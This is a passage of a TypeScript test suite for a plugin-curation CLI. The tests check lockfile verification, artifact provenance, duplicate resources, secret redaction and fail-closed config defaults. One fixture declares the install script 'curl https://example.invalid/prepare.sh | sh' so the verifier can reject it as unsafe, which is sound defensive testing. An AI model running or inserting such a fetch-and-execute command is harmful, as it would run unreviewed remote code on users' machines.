    tarballSha256: "${fixtureShaB}"
    testFiles: 1
    ciWorkflows: 1
    installScripts:
      prepare: "curl https://example.invalid/prepare.sh | sh"
    externalDependencies: []
    networkAccess: []
    credentials: []
    targetProfiles: [web-research]
    active: true
    auditWarnings: []
    rejections: []
`))
    try {
      const result = runVerifyLock(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'verify-lock',
        ok: false,
        issues: [{ code: 'candidate-install-script-unsafe', target: 'plugin-b' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('redacts non-Error failures thrown while loading a catalog', async () => {
    const path = tempFile('catalog.yaml', '')
    vi.resetModules()
    vi.doMock('node:fs', async () => {
      const actual = await vi.importActual<typeof import('node:fs')>('node:fs')
      return {
        ...actual,
        readFileSync: ((file: Parameters<typeof actual.readFileSync>[0], options?: Parameters<typeof actual.readFileSync>[1]) => {
          if (file === path) throw 'sk-non-error-secret'
          return options === undefined ? actual.readFileSync(file) : actual.readFileSync(file, options)
        }) as typeof actual.readFileSync,
      }
    })
    try {
      const commands = await import('../src/index.ts')
      const result = commands.runVerifyLock(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(result.stdout).toContain('[REDACTED]')
      expect(result.stdout).not.toContain('sk-non-error-secret')
    } finally {
      cleanup(path)
    }
  })

  it('requires exact roots when an artifact resolver is injected', () => {
    const result = runVerifyLock(['--json'], {
      artifactResolver: { resolve: () => undefined },
    })

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      issues: [{ message: 'artifactRoots must identify the exact roots used by artifactResolver' }],
    })
  })

  it('fails closed for absent and malformed installed provenance', () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-resolver-'))
    const resolver = createInstalledArtifactResolver([root])
    const candidate = artifactCandidate()
    try {
      expect(resolver.resolve({ ...candidate, expectedPackage: null })).toBeUndefined()
      expect(resolver.resolve(candidate)).toBeUndefined()

      const packageDir = stageCandidatePackage(root, 'plugin-a')
      unlinkSync(join(packageDir, '.dsh-curated-artifact.json'))
      expect(resolver.resolve(candidate)).toBeUndefined()

      writeFileSync(join(packageDir, '.dsh-curated-artifact.json'), JSON.stringify({
        repository: candidate.repository,
        commit: candidate.commit,
        tarballSha256: candidate.tarballSha256,
        changedPaths: [1],
      }))
      expect(() => resolver.resolve(candidate)).toThrow('artifact provenance changedPaths must be a string array')
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('skips artifact resolution for inactive candidates', () => {
    const catalogPath = tempFile('catalog.json', artifactCatalog({
      active: false,
      targetProfiles: [],
      rejections: [{ code: 'inactive-fixture', evidence: 'fixture remains inactive' }],
    }))
    let calls = 0
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [packageRoot],
        artifactResolver: {
          resolve: () => {
            calls += 1
            return undefined
          },
        },
      })

      expect(result.status).toBe(0)
      expect(calls).toBe(0)
    } finally {
      cleanup(catalogPath)
    }
  })

  it.each([
    {
      name: 'repository metadata',
      expectedCode: 'artifact-repository-mismatch',
      candidateOverrides: {},
      setup: (root: string) => {
        const packageDir = stageCandidatePackage(root, 'plugin-a')
        writeFileSync(join(packageDir, '.dsh-curated-artifact.json'), JSON.stringify({
          repository: 'https://github.com/example/other',
          commit: fixtureCommitB,
          tarballSha256: fixtureShaA,
          changedPaths: [],
        }))
      },
    },
    {
      name: 'manifest contents',
      expectedCode: 'artifact-manifest-invalid',
      candidateOverrides: {},
      setup: (root: string) => {
        const packageDir = stageCandidatePackage(root, 'plugin-a')
        writeFileSync(join(packageDir, 'package.json'), '[]')
      },
    },
    {
      name: 'unsafe manifest path',
      expectedCode: 'artifact-manifest-invalid',
      candidateOverrides: { manifestPath: '../package.json' },
      setup: (root: string) => {
        stageCandidatePackage(root, 'plugin-a')
      },
    },
    {
      name: 'missing manifest path',
      expectedCode: 'artifact-manifest-invalid',
      candidateOverrides: { manifestPath: null },
      setup: (root: string) => {
        stageCandidatePackage(root, 'plugin-a')
      },
    },
    {
      name: 'missing bundle declaration',
      expectedCode: 'artifact-bundle-patch-missing',
      candidateOverrides: {},
      setup: (root: string) => {
        stageCandidatePackage(root, 'plugin-a', undefined, { dsh: {} })
      },
    },
  ])('rejects invalid observed artifact $name', ({ expectedCode, candidateOverrides, setup }) => {
    const catalogPath = tempFile('catalog.json', artifactCatalog(candidateOverrides))
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-observed-'))
    setup(root)
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [root],
      })
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toContainEqual(expect.objectContaining({ code: expectedCode }))
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it.each([
    {
      name: 'missing permission config',
      patch: '[]\n',
      code: 'artifact-permission-config-missing',
    },
    {
      name: 'malformed permission config',
      patch: `- insert:
    - id: permission-rules
      name: dsh-permission-rules
      config: invalid
`,
      code: 'artifact-permission-config-malformed',
    },
  ])('rejects $name in installed artifacts', ({ patch, code }) => {
    const catalogPath = tempFile('catalog.json', artifactCatalog({
      id: 'dsh-permission-rules',
      capability: 'permission-policy',
      expectedPackage: 'dsh-permission-rules',
      resources: { waterfallListeners: ['tools/pre-execute:next'] },
    }))
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-permission-'))
    stageCandidatePackage(root, 'dsh-permission-rules', patch)
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--artifact-root', root, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ code, target: 'dsh-permission-rules' }],
      })
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('normalizes observed dependency and install-script ordering', () => {
    const installScripts = {
      prepare: 'node prepare.mjs',
      postinstall: 'node postinstall.mjs',
    }
    const catalogPath = tempFile('catalog.json', artifactCatalog({
      externalDependencies: ['dependency-a', 'dependency-b', 'dependency-c'],
      installScripts,
      nodeEngine: 'invalid || >=22.19.0',
    }))
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-observed-'))
    stageCandidatePackage(root, 'plugin-a', undefined, {
      dependencies: { 'dependency-c': '1.0.0' },
      optionalDependencies: { 'dependency-a': '1.0.0' },
      peerDependencies: { 'dependency-b': '1.0.0' },
      scripts: {
        postinstall: 'node postinstall.mjs',
        prepare: 'node prepare.mjs',
        test: 'vitest',
      },
      engines: { node: 'invalid || >=22.19.0' },
    })
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [root],
        nodeVersion: '22.19.0',
      })

      expect(result.status).toBe(0)
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('accepts absent install scripts and the exact lower bound of a caret Node range', () => {
    const catalogPath = tempFile('catalog.json', artifactCatalog({ nodeEngine: '^22.19.0' }))
    const root = stageCandidateArtifact('plugin-a', {
      scripts: undefined,
      engines: { node: '^22.19.0' },
    })
    try {
      const result = runVerifyLock(['--fixture', catalogPath, `--artifact-root=${root}`, '--json'], {
        nodeVersion: '22.19.0',
      })

      expect(result.status).toBe(0)
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('rejects an invalid observed Node version', () => {
    const catalogPath = tempFile('catalog.json', artifactCatalog())
    const root = stageCandidateArtifact('plugin-a')
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [root],
        nodeVersion: 'invalid',
      })

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'Node version "invalid" is invalid' }],
      })
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })
})

describe('preflight command', () => {
  it('rejects rootless preflight instead of accepting synthesized metadata', () => {
    const result = runPreflight(['--json'])

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'preflight',
      ok: false,
      observed: false,
      accepted: false,
      issues: [{ code: 'preflight-profile-root-required' }],
    })
  })

  it('labels fixture-only preflight as non-observed and not accepted', () => {
    const path = tempFile('patch.yml', '[]\n')
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: true,
        observed: false,
        accepted: false,
      })
    } finally {
      cleanup(path)
    }
  })

  it('loads the installed profile patch in addition to resolved bundle patches', () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-home-'))
    const profileRoot = join(home, 'profiles', 'web-curated')
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      name: 'dsh-profile-web-curated',
      private: true,
      dsh: { profile: { bundles: ['@deepseek-ai/dsh-toolkit'] } },
    }))
    stageCandidatePackage(profileRoot, '@deepseek-ai/dsh-toolkit', `- insert:
    - id: bundle-tool
      name: ./plugin.mjs
      config:
        curated:
          candidateId: bundle-tool
          profile: web-curated
          active: true
          capability: deterministic-tools
          resources:
            toolNames: [fixture_tool]
`)
    writeFileSync(join(profileRoot, 'cordis.patch.yml'), `- insert:
    - id: profile-tool
      name: ./profile-plugin.mjs
      config:
        curated:
          candidateId: profile-tool
          profile: web-curated
          active: true
          capability: profile-tools
          resources:
            toolNames: [fixture_tool]
`)
    try {
      const result = runPreflight([
        '--profile',
        'web-curated',
        '--profile-root',
        profileRoot,
        '--artifact-root',
        profileRoot,
        '--json',
      ])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        observed: true,
        accepted: false,
        entryCount: 2,
        issues: [{ code: 'preflight-tool-name-duplicate' }],
      })
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('reads duplicate resources from installed manifests and real bundle patches', () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-'))
    const patch = `- insert:
    - id: toolkit-a
      name: ./plugin.mjs
      config:
        curated:
          candidateId: dsh-toolkit
          profile: web-curated
          active: true
          capability: deterministic-tools
          resources:
            toolNames: [toolkit_read]
    - id: toolkit-b
      name: ./plugin.mjs
      config:
        curated:
          candidateId: dsh-toolkit-copy
          profile: web-curated
          active: true
          capability: deterministic-tools-copy
          resources:
            toolNames: [toolkit_read]
`
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        name: 'dsh-profile-web-curated',
        private: true,
        dependencies: {
          '@deepseek-ai/dsh-toolkit': `git+https://github.com/dsh-external/dsh-toolkit.git#${fixtureCommitB}`,
        },
        dsh: { profile: { bundles: ['@deepseek-ai/dsh-toolkit'] } },
      }))
      stageCandidatePackage(profileRoot, '@deepseek-ai/dsh-toolkit', patch)

      const result = runPreflight(['--profile', 'web-curated', '--json'], {
        profileRoot,
        artifactResolver: createInstalledArtifactResolver([profileRoot]),
      })
      const payload = JSON.parse(result.stdout) as { entryCount: number; issues: Array<{ code: string }> }

      expect(result.status).toBe(1)
      expect(payload.entryCount).toBe(2)
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-tool-name-duplicate',
      }))
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('rejects an installed bundle whose declared patch is missing', () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        name: 'dsh-profile-web-curated',
        private: true,
        dsh: { profile: { bundles: ['@deepseek-ai/dsh-toolkit'] } },
      }))
      const packageDir = stageCandidatePackage(profileRoot, '@deepseek-ai/dsh-toolkit')
      unlinkSync(join(packageDir, 'cordis.patch.yml'))

      const result = runPreflight(['--profile', 'web-curated', '--json'], {
        profileRoot,
        artifactResolver: createInstalledArtifactResolver([profileRoot]),
      })

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{
          code: 'preflight-bundle-patch-missing',
          target: '@deepseek-ai/dsh-toolkit',
        }],
      })
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('validates installed profile manifests and non-catalog bundles', () => {
    const invalidRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-invalid-'))
    const unresolvedRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-unresolved-'))
    const localRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-local-'))
    try {
      writeFileSync(join(invalidRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: 'plugin-a' } },
      }))
      expect(JSON.parse(runPreflight(['--json'], { profileRoot: invalidRoot }).stdout)).toMatchObject({
        issues: [{ message: 'profile web-curated manifest dsh.profile.bundles must be a string array' }],
      })

      writeFileSync(join(unresolvedRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['fixture-local-bundle'] } },
      }))
      expect(JSON.parse(runPreflight(['--json'], { profileRoot: unresolvedRoot }).stdout)).toMatchObject({
        issues: [{ code: 'preflight-bundle-unresolved', target: 'fixture-local-bundle' }],
      })

      writeFileSync(join(localRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['fixture-local-bundle'] } },
      }))
      stageCandidatePackage(localRoot, 'fixture-local-bundle')
      const accepted = runPreflight(['--json'], {
        profileRoot: localRoot,
        artifactRoots: [localRoot],
      })
      expect(accepted.status).toBe(0)
      expect(JSON.parse(accepted.stdout)).toMatchObject({ observed: true, accepted: true })

      writeFileSync(join(localRoot, 'node_modules', 'fixture-local-bundle', 'package.json'), JSON.stringify({
        name: 'fixture-local-bundle',
        type: 'module',
        main: './plugin.mjs',
        dsh: { bundle: {} },
      }))
      expect(JSON.parse(runPreflight(['--json'], { profileRoot: localRoot }).stdout)).toMatchObject({
        issues: [{ code: 'preflight-bundle-patch-missing', target: 'fixture-local-bundle' }],
      })
    } finally {
      rmSync(invalidRoot, { recursive: true, force: true })
      rmSync(unresolvedRoot, { recursive: true, force: true })
      rmSync(localRoot, { recursive: true, force: true })
    }
  })

  it('applies config-only overrides and accepts fail-closed baseline settings', () => {
    const path = tempFile('patch.yml', `- id: memento
  name: dsh-memento
- id: memento
  config:
    proposals:
      enabled: false
    writePolicies: {}
    writePolicy: ask
- id: untouched
  name: plugin-a
- id: untouched
- id: permission-rules
  config:
    badFilePolicy: fail
    enforce: true
- id: loongsuite-observability
  config:
    captureContent: false
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ code: 'preflight-entry-id-duplicate', target: 'untouched' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('accepts an inactive fallback provider', () => {
    const path = tempFile('patch.yml', `- id: active-search
  name: plugin-a
  config:
    curated:
      candidateId: plugin-a
      profile: web-curated
      active: true
      capability: web-search
- id: inactive-search
  name: plugin-b
  config:
    curated:
      candidateId: plugin-b
      profile: web-curated
      active: false
      capability: web-search
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toEqual({
        command: 'preflight',
        ok: true,
        observed: false,
        accepted: false,
        profile: 'web-curated',
        entryCount: 2,
        issues: [],
      })
    } finally {
      cleanup(path)
    }
  })

  it('uses conflict-table provider ids when active entries declare different capabilities', () => {
    const path = tempFile('patch.yml', `- id: context
  name: dsh-context
  config:
    curated:
      candidateId: dsh-context
      profile: web-curated
      active: true
      capability: context-compression
- id: context-doctor
  name: dsh-context-doctor
  config:
    curated:
      candidateId: dsh-context-doctor
      profile: web-curated
      active: true
      capability: context-diagnostics
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{
          code: 'preflight-provider-duplicate',
          target: 'dsh-context-doctor',
          details: {
            capability: 'context-compression',
            candidates: ['dsh-context', 'dsh-context-doctor'],
          },
        }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects malformed present curated active values without activating inactive entries', () => {
    const path = tempFile('patch.yml', `- id: inactive-search
  name: plugin-a
  config:
    curated:
      candidateId: plugin-a
      profile: web-curated
      active: false
      capability: web-search
- id: string-active
  name: plugin-b
  config:
    curated:
      candidateId: plugin-b
      profile: web-curated
      active: "true"
      capability: web-search
- id: list-active
  name: plugin-c
  config:
    curated:
      candidateId: plugin-c
      profile: web-curated
      active: [true]
      capability: memory
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toEqual({
        command: 'preflight',
        ok: false,
        observed: false,
        accepted: false,
        profile: 'web-curated',
        entryCount: 3,
        issues: [
          {
            code: 'preflight-curated-active-invalid',
            target: 'plugin-b',
            message: 'curated.active must be true or false when present',
          },
          {
            code: 'preflight-curated-active-invalid',
            target: 'plugin-c',
            message: 'curated.active must be true or false when present',
          },
        ],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects duplicate providers, resources, and config secrets with redacted output', () => {
    const path = tempFile('patch.yml', `- id: search-a
  name: plugin-a
  config:
    curated:
      candidateId: plugin-a
      profile: web-curated
      active: true
      capability: web-search
      resources:
        toolNames: [web_search]
        commandNames: [search]
        serviceKeys: [web]
        uiSlots: [search-panel]
        settingsTabs: [settings:search]
        routes: [/search]
        ports: ["127.0.0.1:3000"]
        sqlitePaths: [state/search.sqlite]
        cacheDirs: [cache/search]
        envVars: [SEARCH_TOKEN]
        waterfallListeners: [tools/pre-execute:next]
        automationBehaviors: [auto-memory]
    apiKey: sk-test-secret-value
- id: search-a
  name: plugin-b
  config:
    curated:
      candidateId: plugin-b
      profile: web-curated
      active: true
      capability: web-search
      resources:
        toolNames: [web_search]
        commandNames: [search]
        serviceKeys: [web]
        uiSlots: [search-panel]
        settingsTabs: [settings:search]
        routes: [/search]
        ports: ["127.0.0.1:3000"]
        sqlitePaths: [state/search.sqlite]
        cacheDirs: [cache/search]
        envVars: [SEARCH_TOKEN]
        waterfallListeners: [tools/pre-execute:next]
        automationBehaviors: [auto-memory]
`)
    try {
      const result = runPreflight(['--fixture', path])

      expect(result.status).toBe(1)
      expect(result.stdout).toContain('preflight: failed')
      expect(result.stdout).toContain('preflight-entry-id-duplicate search-a')
      expect(result.stdout).toContain('preflight-provider-duplicate plugin-b')
      expect(result.stdout).toContain('profile web-curated capability web-search has multiple active candidates: plugin-a, plugin-b')
      expect(result.stdout).toContain('preflight-tool-name-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-command-name-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-service-key-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-ui-slot-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-settings-tab-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-route-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-port-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-sqlite-path-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-cache-dir-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-env-var-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-waterfall-listener-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-automation-behavior-duplicate plugin-b')
      expect(result.stdout).toContain('preflight-config-secret search-a')
      expect(result.stdout).not.toContain('sk-test-secret-value')
      expect(result.stdout).not.toContain('SEARCH_TOKEN')
    } finally {
      cleanup(path)
    }
  })

  it('preserves redacted structured details for config secret issues', () => {
    const path = tempFile('patch.yml', `- id: secret-config
  name: plugin-a
  config:
    apiKey: sk-test-secret-value
    retries: 2
    nested:
      safe: visible
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as {
        issues: Array<{ code: string; target?: string; details?: unknown }>
      }

      expect(result.status).toBe(1)
      expect(payload.issues).toEqual([
        {
          code: 'preflight-config-secret',
          target: 'secret-config',
          message: 'entry config must not contain secret material',
          details: {
            config: {
              apiKey: '[REDACTED]',
              retries: 2,
              nested: {
                safe: 'visible',
              },
            },
          },
        },
      ])
      expect(result.stdout).not.toContain('sk-test-secret-value')
    } finally {
      cleanup(path)
    }
  })

  it('rejects two active multi-agent orchestrators in one profile', () => {
    const path = tempFile('patch.yml', `- id: agent-team-gui
  name: dsh-agent-team-gui
  config:
    curated:
      candidateId: dsh-agent-team-gui
      profile: web-coding
      active: true
      capability: multi-agent-orchestration
- id: background-agents
  name: dsh-background-agents
  config:
    curated:
      candidateId: dsh-background-agents
      profile: web-coding
      active: true
      capability: multi-agent-orchestration
`)
    try {
      const result = runPreflight(['--fixture', path, '--profile', 'web-coding', '--json'])
      const payload = JSON.parse(result.stdout) as {
        issues: Array<{
          code: string
          target?: string
          message: string
          details?: unknown
        }>
      }

      expect(result.status).toBe(1)
      expect(payload).toMatchObject({
        command: 'preflight',
        ok: false,
        profile: 'web-coding',
        issues: [
          {
            code: 'preflight-provider-duplicate',
            target: 'dsh-background-agents',
            message: 'profile web-coding capability multi-agent-orchestration has multiple active candidates: dsh-agent-team-gui, dsh-background-agents',
            details: {
              profile: 'web-coding',
              capability: 'multi-agent-orchestration',
              candidates: ['dsh-agent-team-gui', 'dsh-background-agents'],
            },
          },
        ],
      })
    } finally {
      cleanup(path)
    }
  })

  it('parses Cordis include YAML through the source-tree wrapper', () => {
    const path = tempFile('patch.yml', `- id: curated-policy
  name: '@deepseek-ai/dsh-curated-policy'
  config:
    curated:
      candidateId: policy
      profile: web-curated
      active: true
      capability: web-search
`)
    try {
      const result = runNode('preflight.mjs', ['--fixture', path, '--json'])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: true,
        profile: 'web-curated',
        entryCount: 1,
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects active curated entries whose capability is not governed', () => {
    const path = tempFile('patch.yml', `- id: custom-capability
  name: plugin-a
  config:
    curated:
      profile: web-curated
      active: true
      capability: custom-capability
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: false,
        issues: [{ code: 'preflight-capability-unmanaged', target: 'plugin-a' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects malformed patch inputs in text mode', () => {
    const path = tempFile('patch.yml', 'not: a list\n')
    try {
      const result = runPreflight(['--fixture', path])

      expect(result.status).toBe(1)
      expect(result.stderr).toBe('')
      expect(result.stdout).toContain('preflight: failed (1 issue)')
      expect(result.stdout).toContain('preflight-input-invalid')
      expect(result.stdout).toContain('curated patch must be a top-level YAML array')
    } finally {
      cleanup(path)
    }
  })

  it('flattens nested insert lists and ignores non-entry rows', () => {
    const path = tempFile('patch.yml', `- ignored
- insert:
    - id: nested
      name: plugin-a
      config:
        curated:
          capability: web-search
          active: true
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: true,
        entryCount: 1,
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects non-curated secret config without a target', () => {
    const path = tempFile('patch.yml', `- config: sk-preflight-secret
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string; message: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toEqual([
        {
          code: 'preflight-config-secret',
          message: 'entry config must not contain secret material',
          details: { config: '[REDACTED]' },
        },
      ])
      expect(result.stdout).not.toContain('sk-preflight-secret')
    } finally {
      cleanup(path)
    }
  })

  it('rejects secret-like array and object config values', () => {
    const path = tempFile('patch.yml', `- id: array-secret
  config:
    token: [present]
- id: object-secret
  config:
    secret:
      nested: value
- id: number-token
  config:
    token: 0
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toEqual([
        {
          code: 'preflight-config-secret',
          target: 'array-secret',
          message: 'entry config must not contain secret material',
          details: { config: { token: '[REDACTED]' } },
        },
        {
          code: 'preflight-config-secret',
          target: 'object-secret',
          message: 'entry config must not contain secret material',
          details: { config: { secret: '[REDACTED]' } },
        },
      ])
    } finally {
      cleanup(path)
    }
  })

  it('rejects waterfall listener declarations that omit next delegation', () => {
    const path = tempFile('patch.yml', `- id: listener
  name: plugin-a
  config:
    curated:
      candidateId: plugin-a
      profile: web-curated
      active: true
      capability: web-search
      resources:
        waterfallListeners: [tools/pre-execute]
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: false,
        issues: [{ code: 'preflight-waterfall-next-missing', target: 'plugin-a' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects data boundary defaults that violate superpowers security rules', () => {
    const path = tempFile('patch.yml', `- id: unsafe-boundaries
  name: plugin-a
  config:
    telemetry:
      captureBody: true
    importMode: apply
    sessionsWrite: true
    externalBodyEgress: true
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string; message: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toEqual([
        { code: 'preflight-config-import-not-dry-run', target: 'unsafe-boundaries', message: 'config import must default to dry-run' },
        { code: 'preflight-external-body-egress', target: 'unsafe-boundaries', message: 'external systems must not egress full body content by default' },
        { code: 'preflight-otel-capture-body', target: 'unsafe-boundaries', message: 'OTel config must keep captureBody false by default' },
        { code: 'preflight-session-write', target: 'unsafe-boundaries', message: 'config import must not write sessions by default' },
      ])
    } finally {
      cleanup(path)
    }
  })

  it('rejects unsafe values for the real baseline candidate config fields', () => {
    const path = tempFile('patch.yml', `- id: memento
  config:
    writePolicy: auto
    writePolicies:
      source:import: auto
    proposals:
      enabled: true
      maxChars: 2000
      maxPending: 8
- id: permission-rules
  config:
    rulesFile: .dsh/rules.yaml
    badFilePolicy: ignore-with-warning
    maxRules: 256
    patternMode: glob
    watch: true
    enforce: false
- id: loongsuite-observability
  config:
    captureContent: true
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toEqual([
        { code: 'preflight-memory-auto-proposals', target: 'memento', message: 'memory config must disable automatic proposal capture' },
        { code: 'preflight-memory-write-overrides', target: 'memento', message: 'memory config must not override approval-gated writes' },
        { code: 'preflight-memory-write-policy', target: 'memento', message: 'memory writes must require approval' },
        { code: 'preflight-otel-capture-content', target: 'loongsuite-observability', message: 'OTel config must explicitly disable content capture' },
        { code: 'preflight-permission-bad-file-policy', target: 'permission-rules', message: 'permission rules must fail when their rule file is invalid' },
        { code: 'preflight-permission-enforcement-disabled', target: 'permission-rules', message: 'permission rules must explicitly enable enforcement' },
      ])
    } finally {
      cleanup(path)
    }
  })

  it('deduplicates repeated entry id diagnostics', () => {
    const path = tempFile('patch.yml', `- id: duplicate
- id: duplicate
- id: duplicate
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toEqual([
        {
          code: 'preflight-entry-id-duplicate',
          target: 'duplicate',
          message: 'curated patch contains duplicate entry ids',
        },
      ])
    } finally {
      cleanup(path)
    }
  })

  it('redacts secret-like target values in text and JSON diagnostics', () => {
    const path = tempFile('patch.yml', `- id: sk-target-secret
- id: sk-target-secret
`)
    try {
      const json = runPreflight(['--fixture', path, '--json'])
      const text = runPreflight(['--fixture', path])
      const payload = JSON.parse(json.stdout) as { issues: Array<{ code: string; target?: string; message: string }> }

      expect(json.status).toBe(1)
      expect(payload.issues).toEqual([
        {
          code: 'preflight-entry-id-duplicate',
          target: '[REDACTED]',
          message: 'curated patch contains duplicate entry ids',
        },
      ])
      expect(json.stdout).not.toContain('sk-target-secret')
      expect(text.stdout).toContain('preflight-entry-id-duplicate [REDACTED]')
      expect(text.stdout).not.toContain('sk-target-secret')
    } finally {
      cleanup(path)
    }
  })

  it('falls back from missing curated ids to plugin names', () => {
    const path = tempFile('patch.yml', `- name: plugin-a
  config:
    curated:
      profile: web-curated
      active: true
      capability: web-search
      resources:
        toolNames: [web_search]
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: true,
        entryCount: 1,
        issues: [],
      })
    } finally {
      cleanup(path)
    }
  })

  it('falls back from missing curated ids to entry ids', () => {
    const path = tempFile('patch.yml', `- id: id-fallback
  config:
    curated:
      profile: web-curated
      active: true
      capability: web-search
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: true,
        entryCount: 1,
        issues: [],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects active curated entries without candidate fallback or capability metadata', () => {
    const path = tempFile('patch.yml', `- config:
    curated:
      profile: web-curated
      active: true
      capability: web-search
- id: incomplete
  config:
    curated:
      profile: web-curated
      active: true
`)
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: false,
        entryCount: 2,
        issues: [
          {
            code: 'preflight-curated-candidate-id-missing',
